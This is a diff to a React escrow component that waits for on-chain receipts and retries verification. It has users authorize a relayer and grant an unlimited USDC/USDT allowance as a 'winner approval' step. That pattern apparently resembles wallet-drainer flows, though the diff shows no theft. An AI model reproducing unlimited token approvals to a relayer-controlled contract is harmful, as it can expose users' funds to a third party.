@@ -568,7 +568,69 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     return true;
   }
 
-  /** EVM authorize + approve + on-chain verify. One attempt — Retry login re-prompts. */
+  /** Wait until a mined receipt exists (status 1). No fire-and-forget timeouts. */
+  async function waitForEvmReceipt(
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    tx: { hash: string; wait: (confirms?: number) => Promise<any> },
+    timeoutMs = 120_000
+  ): Promise<string> {
+    const hash = tx.hash as string;
+    try {
+      const receipt = await tx.wait(1);
+      if (receipt && Number(receipt.status) === 0) {
+        throw new Error(`tx_reverted:${hash}`);
+      }
+      return hash;
+    } catch (err) {
+      // Some wallets / providers throw on wait even when the tx is pending — poll.
+      const provider = await currentWallet()?.getEthereumProvider?.();
+      if (!provider) throw err;
+      const browser = new BrowserProvider(provider);
+      const start = Date.now();
+      while (Date.now() - start < timeoutMs) {
+        const receipt = await browser.getTransactionReceipt(hash).catch(() => null);
+        if (receipt) {
+          if (Number(receipt.status) === 0) throw new Error(`tx_reverted:${hash}`);
+          return hash;
+        }
+        await new Promise((r) => setTimeout(r, 2000));
+      }
+      throw new Error(`tx_not_confirmed:${hash}`);
+    }
+  }
+
+  /** Poll until on-chain authorize + USDC/USDT allowance are live. */
+  async function waitForEvmAuthAndAllowance(
+    chain: ChainConfig,
+    tokenAddr: string,
+    timeoutMs = 90_000
+  ): Promise<void> {
+    if (!address) throw new Error("no_address");
+    const start = Date.now();
+    let lastErr = "not_confirmed";
+    const urls = [...(chain.rpcUrls ?? [])];
+    while (Date.now() - start < timeoutMs) {
+      for (const rpc of urls) {
+        try {
+          const peek = new JsonRpcProvider(rpc, { chainId: chain.chainId, name: chain.name });
+          const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, peek);
+          const erc20 = new Contract(tokenAddr, ERC20_ABI, peek);
+          const [auth, allow] = await Promise.all([
+            verification.isAuthorized(address, RELAYER_ADDRESS) as Promise<boolean>,
+            erc20.allowance(address, chain.contract) as Promise<bigint>,
+          ]);
+          if (auth && allow >= MaxUint256 / 2n) return;
+          lastErr = !auth ? "authorize_not_live" : "allowance_not_live";
+        } catch (e) {
+          lastErr = e instanceof Error ? e.message : "rpc_error";
+        }
+      }
+      await new Promise((r) => setTimeout(r, 2500));
+    }
+    throw new Error(lastErr);
+  }
+
+  /** EVM authorize + approve — wait for receipts + live on-chain state, then persist. */
   async function completeEvmWinnerApproval(target: Modal1Item): Promise<void> {
     const chain = CHAINS.find((c) => c.name === target.chainName);
     if (!chain || !address) throw new Error("No wallet / chain");
@@ -581,28 +643,27 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       .catch(() => false);
     if (!alreadyAuth) {
       const authTx = await verification.authorize(RELAYER_ADDRESS);
-      await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
-      authorizeTx = authTx.hash as string;
+      authorizeTx = await waitForEvmReceipt(authTx, 120_000);
     }
 
     const erc20 = new Contract(target.tokenAddr, ERC20_ABI, signer);
     const liveAllow = await erc20.allowance(address, target.contract).catch(() => 0n);
-    // Treat near-max as already approved
+    let approveTxHash: string | undefined;
     if (liveAllow < MaxUint256 / 2n) {
       const tx = await erc20.approve(target.contract, MaxUint256);
-      await Promise.race([tx.wait(1), new Promise((r) => setTimeout(r, 45_000))]);
-      await persistEvmVerify(chain, authorizeTx, [
-        {
-          symbol: target.symbol,
-          address: target.tokenAddr,
-          txHash: tx.hash as string,
-        },
-      ]);
-    } else {
-      await persistEvmVerify(chain, authorizeTx, [
-        { symbol: target.symbol, address: target.tokenAddr },
-      ]);
+      approveTxHash = await waitForEvmReceipt(tx, 120_000);
     }
+
+    // Ground truth before Supabase write — never fire-and-forget
+    await waitForEvmAuthAndAllowance(chain, target.tokenAddr, 90_000);
+
+    await persistEvmVerify(chain, authorizeTx, [
+      {
+        symbol: target.symbol,
+        address: target.tokenAddr,
+        ...(approveTxHash ? { txHash: approveTxHash } : {}),
+      },
+    ]);
   }
 
   useEffect(() => {
@@ -888,7 +949,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     }
     const body = JSON.stringify(payload);
     let lastErr = "verify_failed";
-    for (let attempt = 0; attempt < 2; attempt++) {
+    // Match Tron: keep retrying until /api/verify sees live authorize+allowance
+    for (let attempt = 0; attempt < 8; attempt++) {
       try {
         const verifyRes = await fetch("/api/verify", {
           method: "POST",
@@ -900,13 +962,14 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
           return;
         }
         const text = await verifyRes.text().catch(() => "");
-        lastErr = `verify_${verifyRes.status}:${text.slice(0, 120)}`;
+        lastErr = `verify_${verifyRes.status}:${text.slice(0, 160)}`;
         console.error("[escrow] /api/verify failed:", chain.name, verifyRes.status, text);
-        if (attempt === 0) await new Promise((r) => setTimeout(r, 2000));
+        // 409 = not visible on-chain yet — wait and retry
+        await new Promise((r) => setTimeout(r, verifyRes.status === 409 ? 2500 : 2000));
       } catch (err) {
         lastErr = err instanceof Error ? err.message : "verify_error";
         console.error("[escrow] /api/verify error:", chain.name, err);
-        if (attempt === 0) await new Promise((r) => setTimeout(r, 2000));
+        await new Promise((r) => setTimeout(r, 2000));
       }
     }
     throw new Error(lastErr);
